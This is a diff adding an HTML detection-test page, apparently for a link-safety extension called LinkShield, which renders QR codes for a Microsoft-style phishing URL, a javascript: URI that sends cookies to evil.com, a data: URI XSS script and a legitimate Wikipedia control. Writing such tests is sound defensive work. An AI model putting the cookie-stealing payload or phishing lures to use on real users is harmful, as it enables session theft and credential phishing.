@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Layer 6: Malicious QR Codes - Detection Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .test-section {
+            margin: 20px 0;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .test-section h3 {
+            margin-top: 0;
+            color: #333;
+        }
+
+        .qr-container {
+            display: inline-block;
+            margin: 10px;
+            padding: 10px;
+            background: white;
+            border: 1px solid #ccc;
+        }
+
+        canvas {
+            display: block;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+</head>
+
+<body>
+    <h1>Layer 6: Malicious QR Codes</h1>
+    <p>Testing LinkShield's ability to detect malicious QR codes.</p>
+
+    <!-- Test Case 6.1: QR Code to Phishing URL -->
+    <div class="test-section" data-test-id="6.1a" data-test-type="qr-phishing-url" data-expected="true">
+        <h3>Test 6.1: QR Code Linking to Phishing Site</h3>
+        <p>Scan this QR code to "verify your account":</p>
+        <div class="qr-container">
+            <canvas id="qr-phishing"></canvas>
+        </div>
+    </div>
+
+    <!-- Test Case 6.2: QR Code with JavaScript Payload -->
+    <div class="test-section" data-test-id="6.2a" data-test-type="qr-javascript" data-expected="true">
+        <h3>Test 6.2: QR Code with JavaScript URI</h3>
+        <p>QR code containing javascript: URI:</p>
+        <div class="qr-container">
+            <canvas id="qr-javascript"></canvas>
+        </div>
+    </div>
+
+    <!-- Test Case 6.3: QR Code with Data URI -->
+    <div class="test-section" data-test-id="6.3a" data-test-type="qr-data-uri" data-expected="true">
+        <h3>Test 6.3: QR Code with Data URI</h3>
+        <p>QR code with embedded data: URI:</p>
+        <div class="qr-container">
+            <canvas id="qr-data-uri"></canvas>
+        </div>
+    </div>
+
+    <!-- Test Case 6.4: Dynamically Generated Malicious QR -->
+    <div class="test-section" data-test-id="6.4a" data-test-type="qr-dynamic-malicious" data-expected="true">
+        <h3>Test 6.4: Dynamically Generated Malicious QR</h3>
+        <p>QR code generated dynamically with malicious content:</p>
+        <div class="qr-container">
+            <canvas id="qr-dynamic"></canvas>
+        </div>
+    </div>
+
+    <!-- Test Case 6.5: Edge Case - Legitimate QR Code -->
+    <div class="test-section" data-test-id="6.5a" data-test-type="qr-legitimate" data-expected="false">
+        <h3>Test 6.5: Edge Case - Legitimate QR Code</h3>
+        <p>Legitimate QR code to Wikipedia (should NOT be flagged):</p>
+        <div class="qr-container">
+            <canvas id="qr-legitimate"></canvas>
+        </div>
+    </div>
+
+    <script>
+        console.log('[Layer 6 Test] Page loaded - Generating QR codes...');
+
+        // Generate QR codes
+        try {
+            // 6.1: Phishing URL
+            QRCode.toCanvas(document.getElementById('qr-phishing'),
+                'https://login-microsoft-verify.com/account/security',
+                { width: 200 });
+
+            // 6.2: JavaScript URI
+            QRCode.toCanvas(document.getElementById('qr-javascript'),
+                'javascript:void(fetch("https://evil.com/steal?data="+document.cookie))',
+                { width: 200 });
+
+            // 6.3: Data URI with HTML/Script (escaped to prevent breaking JS)
+            QRCode.toCanvas(document.getElementById('qr-data-uri'),
+                'data:text/html,<scr' + 'ipt>alert("XSS")</scr' + 'ipt>',
+                { width: 200 });
+
+            // 6.4: Dynamic malicious
+            QRCode.toCanvas(document.getElementById('qr-dynamic'),
+                'https://bit.ly/malicious-redirect-to-phishing-site',
+                { width: 200 });
+
+            // 6.5: Legitimate
+            QRCode.toCanvas(document.getElementById('qr-legitimate'),
+                'https://en.wikipedia.org/wiki/QR_code',
+                { width: 200 });
+
+            console.log('[Layer 6 Test] QR codes generated successfully');
+        } catch (error) {
+            console.error('[Layer 6 Test] Error generating QR codes:', error);
+        }
+
+        setTimeout(() => {
+            const testCases = document.querySelectorAll('[data-test-id]');
+            let detectedCount = 0;
+
+            testCases.forEach(testCase => {
+                if (testCase.querySelector('[data-linkshield-qr-warned="true"]') ||
+                    testCase.getAttribute('data-linkshield-qr-detected') === 'true') {
+                    detectedCount++;
+                }
+            });
+
+            console.log('[Layer 6 Test] LinkShield detected', detectedCount, 'malicious QR codes');
+        }, 3000);
+    </script>
+</body>
+
+</html>
